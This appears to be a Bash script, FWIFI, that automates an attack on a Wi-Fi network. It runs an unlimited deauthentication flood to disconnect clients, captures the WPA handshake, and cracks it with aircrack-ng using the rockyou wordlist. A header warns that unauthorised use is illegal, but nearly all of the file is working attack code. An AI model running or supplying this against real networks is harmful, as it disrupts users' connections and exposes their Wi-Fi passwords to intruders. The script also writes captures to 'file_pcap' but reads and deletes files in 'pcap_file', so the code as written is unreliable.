#!/bin/bash
#---------------------------------------------------------------------------------------------------------------------------
#
# Script Name: FWIFI
# Script Description: FWIFI is a Bash script designed to perform a series of penetration tests on Wi-Fi networks.
# Script Author: rofidoang03
#
#---------------------------------------------------------------------------------------------------------------------------
#
# Github: https://github.com/rofidoang03/FWIFI
#
#---------------------------------------------------------------------------------------------------------------------------
#
# - WARNING -
#
# Using this script on networks you do not own without permission is illegal.
# Make sure you have permission from the network owner before conducting penetration tests.
# Misuse of this tool may violate the law and the privacy of others.
# Users are fully responsible for the actions taken using this script.
#
#---------------------------------------------------------------------------------------------------------------------------

clear
if [[ $EUID -ne 0 ]]; then
    echo "Run as root."
    echo ""
    exit 1
fi
echo ""
echo "+---------------------------------------------+"
echo "| _____________      __.______________.___    |"
echo "| \_   _____/  \    /  \   \_   _____/|   |   |"
echo "|  |    __) \   \/\/   /   ||    __)  |   |   |"
echo "|  |     \   \        /|   ||     \   |   |   |"
echo "|  \___  /    \__/\  / |___|\___  /   |___|   |"
echo "|      \/          \/           \/            |"
echo "|       https://github.com/rofidoang03/fwifi  |"
echo "+---------------------------------------------+"
echo ""
read -p "Enter the wireless interface name (example: wlan0): " interface
if [[ -z "$interface" ]]; then
    echo "Wireless interface name cannot be empty."
    echo ""
    exit 1
fi
if ! iwconfig "$interface" >> /dev/null 2>&1; then
    echo "Invalid wireless interface. Please provide a valid wireless interface name."
    echo ""
    exit 1
fi
airmon-ng check kill ; airmon-ng start "$interface"
airodump-ng "$interface"
echo ""
read -p "Enter the BSSID of the target network: " bssid
if [[ -z "$bssid" ]]; then
    echo "BSSID cannot be empty."
    echo ""
    exit 1
fi
if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "Invalid BSSID format. Please enter the BSSID in the format XX:XX:XX:XX:XX:XX."
    echo ""
    exit 1
fi
read -p "Enter the Channel number: " channel
if [[ -z "$channel" ]]; then
    echo "Channel cannot be empty."
    echo ""
    exit 1
fi
if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
    echo "Invalid Channel. Please enter a valid Channel number."
    echo ""
    exit 1
fi
iwconfig "$interface" channel "$channel"
timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
output_file="${bssid}_${timestamp}"
xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w file_pcap/$output_file $interface"
cd "pcap_file"
rm *csv *xml
cd ..
pcap_file="pcap_file/$output_file-01.cap"
echo ""
handshakes=$(tshark -r "$pcap_file" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
if [[ $handshakes -gt 0 ]]; then
    aircrack-ng -w "wordlists/rockyou.txt" "pcap_file/$output_file-01.cap"
    echo ""
    echo "      Thank you for using FWIFI :)"
    echo ""
    exit 0
else
    echo ""
    echo "File '$pcap_file' does not have enough handshakes to be cracked with aircrack-ng."
    echo ""
    exit 1
fi
